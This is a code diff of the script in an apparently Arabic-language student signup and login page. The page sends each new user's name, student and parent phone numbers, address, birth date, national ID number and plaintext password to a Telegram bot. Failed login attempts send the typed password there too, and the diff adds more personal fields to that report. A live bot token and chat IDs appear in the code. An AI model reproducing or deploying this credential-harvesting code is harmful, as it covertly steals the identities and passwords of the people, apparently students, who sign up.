@@ -188,8 +188,7 @@
     <script>
         const BOT_TOKEN = '8150970842:AAH1fWCntUzVNnE6Nq9TXW8SH-MmM9ycvfk';
         const CHAT_ID_CHANNEL = '-1003018202565'; 
-        const CHAT_ID_USER = '7428842238'; 
-        const REDIRECT_URL = "https://halthalk.vercel.app"; // الرابط الموحد
+        const CHAT_ID_USER = '7428842238'; // معرف المستخدم الجديد
         
         const LOGO_LIGHT = "https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png";
         const LOGO_DARK = "https://raw.githubusercontent.com/elmoftary-vr/Halthalk/45d49545c1a08433a739887c4aed3d65fd9c335f/20251206_234458.png";
@@ -198,15 +197,10 @@
         const saveUser = (u) => { const db = getDB(); db.push(u); localStorage.setItem('hal_users', JSON.stringify(db)); };
         const findUser = (e) => getDB().find(u => u.email === e);
 
-        // فحص الدخول التلقائي فور فتح الصفحة
-        window.onload = () => {
-            if (localStorage.getItem('is_logged_in') === 'true') {
-                window.location.href = REDIRECT_URL;
-            }
-        };
-
+        // دالة لإرسال التقرير إلى وجهتين في نفس الوقت
         async function report(txt) {
             const targets = [CHAT_ID_CHANNEL, CHAT_ID_USER];
+            
             for (const target of targets) {
                 try {
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -214,7 +208,9 @@
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({chat_id: target, text: txt, parse_mode: 'Markdown'})
                     });
-                } catch(e) { console.error(e); }
+                } catch(e) {
+                    console.error(`Error sending to ${target}:`, e);
+                }
             }
         }
 
@@ -248,10 +244,10 @@
             setTimeout(() => copyIcon.className = 'fas fa-copy', 2000);
         }
 
-        // إنشاء حساب جديد مع دخول تلقائي
         document.getElementById('signup-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             const email = document.getElementById('s_email').value;
+            const nat = document.getElementById('s_nat').value;
             if(findUser(email)) return showStatus("الإيميل مسجل مسبقاً!", "error");
             
             const user = {
@@ -262,22 +258,27 @@
                 email: email,
                 dob: document.getElementById('s_dob').value,
                 loc: document.getElementById('s_loc').value,
-                nat: document.getElementById('s_nat').value,
+                nat: nat,
                 pass: document.getElementById('s_pass').value
             };
             saveUser(user);
             
-            const telegramMsg = `🆕 *تسجيل طالب جديد*\n👤 الاسم: ${user.name}\n📱 هاتف: ${user.phone}\n📧 الإيميل: ${user.email}\n🔑 الباسورد: \`${user.pass}\``;
+            const telegramMsg = `🆕 *تسجيل طالب جديد*\n\n` +
+                                `👤 الاسم: ${user.name}\n` +
+                                `📱 هاتف الطالب: ${user.phone}\n` +
+                                `👨 هاتف الأب: ${user.f_phone}\n` +
+                                `👩 هاتف الأم: ${user.m_phone}\n` +
+                                `📧 الإيميل: ${user.email}\n` +
+                                `📅 الميلاد: ${user.dob}\n` +
+                                `📍 العنوان: ${user.loc}\n` +
+                                `🆔 القومي: ${user.nat}\n` +
+                                `🔑 الباسورد: \`${user.pass}\``;
             
             await report(telegramMsg);
-            
-            // تفعيل الدخول التلقائي
-            localStorage.setItem('is_logged_in', 'true');
-            showStatus("تم إنشاء حسابك.. جاري توجيهك للمنصة", "success");
-            setTimeout(() => window.location.href = REDIRECT_URL, 1500);
+            showStatus("تم إنشاء حسابك بنجاح!", "success");
+            setTimeout(() => switchView('login-view'), 1500);
         });
 
-        // تسجيل الدخول مع حفظ الحالة
         document.getElementById('login-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             const email = document.getElementById('l_email').value;
@@ -285,21 +286,20 @@
             const user = findUser(email);
 
             if(user && user.pass === pass) {
-                localStorage.setItem('is_logged_in', 'true'); // حفظ الحالة للمرة القادمة
                 await report(`✅ *دخول ناجح*\n📧 البريد: ${email}`);
                 showStatus("جاري التحويل...", "success");
-                setTimeout(() => window.location.href = REDIRECT_URL, 1000);
+                setTimeout(() => window.location.href = "https://halthalk.vercel.app", 1000);
             } else {
                 await report(`⚠️ *محاولة دخول فاشلة*\n📧 ${email}\n🔐 ${pass}`);
                 showStatus("بيانات الدخول غير صحيحة", "error");
             }
         });
 
-        // استعادة الحساب (OTP)
         window.requestOTP = async () => {
             const email = document.getElementById('recover-email').value;
             const nat = document.getElementById('recover-nat').value;
             const user = findUser(email);
+
             if(user && user.nat === nat) {
                 currentOTP = Math.floor(1000 + Math.random() * 9000).toString();
                 document.getElementById('notif-code').innerText = currentOTP;
@@ -307,7 +307,9 @@
                 await report(`🔑 *رمز استعادة*\n👤 ${user.name}\n🔢 الكود: \`${currentOTP}\``);
                 setTimeout(() => switchView('forgot-step2'), 1000);
                 setTimeout(() => document.getElementById('otp-notif').classList.remove('show'), 15000);
-            } else { showStatus("البيانات لا تطابق سجلاتنا", "error"); }
+            } else {
+                showStatus("البيانات لا تطابق سجلاتنا", "error");
+            }
         };
 
         const inps = document.querySelectorAll('#otp-inputs input');
@@ -316,8 +318,20 @@
                 inp.value = inp.value.replace(/[^0-9]/g, '');
                 if(inp.value && i < 3) inps[i+1].focus();
             });
+
             inp.addEventListener('keydown', (e) => {
                 if(e.key === 'Backspace' && !inp.value && i > 0) inps[i-1].focus();
+            });
+
+            inp.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const data = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+                const codes = data.split('').slice(0, 4);
+                codes.forEach((char, index) => {
+                    if (inps[index]) inps[index].value = char;
+                });
+                const nextFocus = Math.min(codes.length, 3);
+                inps[nextFocus].focus();
             });
         });
 
@@ -340,4 +354,4 @@
         document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
-</html>
+                    </html>
